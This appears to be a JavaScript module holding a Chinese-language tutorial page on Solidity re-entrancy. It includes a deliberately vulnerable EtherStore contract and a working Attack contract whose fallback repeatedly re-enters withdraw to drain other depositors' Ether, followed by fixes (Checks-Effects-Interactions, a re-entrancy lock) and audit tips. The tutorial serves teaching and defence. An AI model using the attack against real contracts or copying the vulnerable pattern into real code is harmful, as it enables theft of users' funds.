// metadata
export const version = "0.8.10"
export const title = "Re-Entrancy 重入漏洞"
export const description = "An example of re-entrancy attack in Solidity"

const html = `<h3 id="前置知识">前置知识</h3>
<p>重入漏洞相信大家都有所耳闻了，那么什么是重入漏洞呢？</p>
<p>以太坊智能合约的特点之一是合约之间可以进行相互间的外部调用。同时，以太坊的转账不仅仅局限于外部账户，合约账户同样可以拥有以太并进行转账等操作，且合约在接收以太的时候会触发 fallback 函数执行相应的逻辑，这是一种隐藏的外部调用。</p>
<p>我们先给重入漏洞下个定义：可以认为合约中所有的外部调用都是不安全的，都有可能存在重入漏洞。例如：如果外部调用的目标是一个攻击者可以控制的恶意的合约，那么当被攻击的合约在调用恶意合约的时候攻击者可以执行恶意的逻辑然后再重新进入到被攻击合约的内部，通过这样的方式来发起一笔非预期的外部调用，从而影响被攻击合约正常的执行逻辑。</p>
<h3 id="漏洞示例">漏洞示例</h3>
<p>下面面的代码：<code>EtherStore</code> 就是个普通的充提币的合约，凭什么说他有重入攻击呢？我们来看这个合约的 <code>withdraw</code> 函数，这个函数中的转账操作有一个外部调用（msg.sender.call{value: bal}），所以我们就可以认为这个合约是可能有重入漏洞的，但是具体能否产生危害还需要更深入的分析：</p>
<ol>
<li>所有的外部调用都是不安全的且合约在接收以太的时候会触发 <code>fallback</code> 函数执行相应的逻辑，这是一种隐藏的外部调用，这种隐藏的外部调用是否会造成危害呢？</li>
<li>我们可以看到在 <code>withdraw</code> 函数中是先执行外部调用进行转账后才将账户余额清零的，那我们可不可以在转账外部调用的时候构造一个恶意的逻辑合约在合约执行 <code>balance[msg.sender]=0</code> 之前一直循环调用 <code>withdraw</code> 函数一直提币从而将合约账户清空呢？</li>
</ol>
<p>下面我们看看攻击者编写的攻击合约中的攻击手法是否与我们的漏洞分析相同：</p>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.10;</span>

<span class="hljs-comment">/*
我们看到 EtherStore 合约是一个充提合约，我们可以在其中充提以太。
该合约会受到重入攻击
让我们看看为什么。

1. 部署 EtherStore 合约；
2. 用户 1（Alice）和用户 2（Bob）都分别将 1 个以太币充值到 EtherStore 合约中；
3. 攻击者 Eve 部署 Attack 合约时传入 EtherStore 合约的地址；
4. 攻击者 Eve 调用 Attack.attack 函数，Attack.attack 又调用 EtherStore.deposit 函数，
    充值 1 个以太币到 EtherStore 合约中，此时 EtherStore 合约中共有 3 个以太，
    分别为 Alice、Bob 的 2 个以太和攻击者 Eve 刚刚充值进去的 1 个以太。
    然后 Attack.attack 又调用 EtherStore.withdraw 函数将自己刚刚充值的以太取出，
    此时 EtherStore 合约中就只剩下 Alice、Bob 的 2 个以太了；

接下来会发送什么？
当 Attack.attack 调用 EtherStore.withdraw 提取了先前 Eve 充值的 1 个以太时会触发 Attack.fallback 函数。
这时只要 EtherStore 合约中的以太大于或等于 1 Attack.fallback 就会一直调用 EtherStore.withdraw 函数将 EtherStore 合约中的以太提取到 Attack 合约中，直到 EtherStore 合约中的以太小于 1 。
这样攻击者 Eve 会得到 EtherStore 合约中剩下的 2 个以太币（Alice、Bob 充值的两枚以太币）。

下面是攻击者的函数调用流程：
- Attack.attack
- EtherStore.deposit
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack.fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
*/</span>

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">EtherStore</span> </span>{
    <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">uint</span>) <span class="hljs-keyword">public</span> balances;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deposit</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        <span class="hljs-keyword">uint</span> bal <span class="hljs-operator">=</span> balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>];
        <span class="hljs-built_in">require</span>(bal <span class="hljs-operator">&gt;</span> <span class="hljs-number">0</span>);

        (<span class="hljs-keyword">bool</span> sent, ) <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value</span>: bal}(<span class="hljs-string">""</span>);
        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);

        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    }

    <span class="hljs-comment">// Helper function to check the balance of this contract</span>
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBalance</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span></span>) </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>).<span class="hljs-built_in">balance</span>;
    }
}

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Attack</span> </span>{
    EtherStore <span class="hljs-keyword">public</span> etherStore;

    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _etherStoreAddress</span>) </span>{
        etherStore <span class="hljs-operator">=</span> EtherStore(_etherStoreAddress);
    }

    <span class="hljs-comment">// Fallback is called when EtherStore sends Ether to this contract.</span>
    <span class="hljs-function"><span class="hljs-keyword">fallback</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">address</span>(etherStore).<span class="hljs-built_in">balance</span> <span class="hljs-operator">&gt;</span><span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>) {
            etherStore.withdraw();
        }
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span> <span class="hljs-operator">&gt;</span><span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>);
        etherStore.deposit{<span class="hljs-built_in">value</span>: <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>}();
        etherStore.withdraw();
    }

    <span class="hljs-comment">// Helper function to check the balance of this contract</span>
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBalance</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span></span>) </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>).<span class="hljs-built_in">balance</span>;
    }
}
</code></pre>
<h3 id="修复建议">修复建议</h3>
<ol>
<li>作为开发人员</li>
</ol>
<p>看了上面的攻击手法相信大家对重入漏洞都会有一个自己的认知，但是只会攻击可不行，我们的目的是为了防御，那么作为开发人员如何避免写出漏洞代码还有作为审计人员如何快速发现问题代码呢，下面我们就以这两个身份来分析如何防御重入漏洞和如何在代码中快速找出重入漏洞：</p>
<ul>
<li><p>写代码时需要遵循先判断，后写入变量在进行外部调用的编码规范（Checks-Effects-Interactions）；</p>
</li>
<li><p>加入防重入锁。</p>
</li>
</ul>
<p>下面是一个防重入锁的代码示例：</p>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.10;</span>

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">ReEntrancyGuard</span> </span>{
    <span class="hljs-keyword">bool</span> <span class="hljs-keyword">internal</span> locked;

    <span class="hljs-function"><span class="hljs-keyword">modifier</span> <span class="hljs-title">noReentrant</span>(<span class="hljs-params"></span>) </span>{
        <span class="hljs-built_in">require</span>(<span class="hljs-operator">!</span>locked, <span class="hljs-string">"No re-entrancy"</span>);
        locked <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;
        <span class="hljs-keyword">_</span>;
        locked <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
    }
}
</code></pre>
<ol start="2">
<li>作为审计人员</li>
</ol>
<p>作为审计人员我们需要关注的是重入漏洞的特征：所有涉及到外部合约调用的代码位置都是不安全的。这样在审计过程中需要重点关注外部调用，然后推演外部调用可能产生的危害，这样就能判断这个地方是否会因为重入点而产生危害。</p>
`

export default html
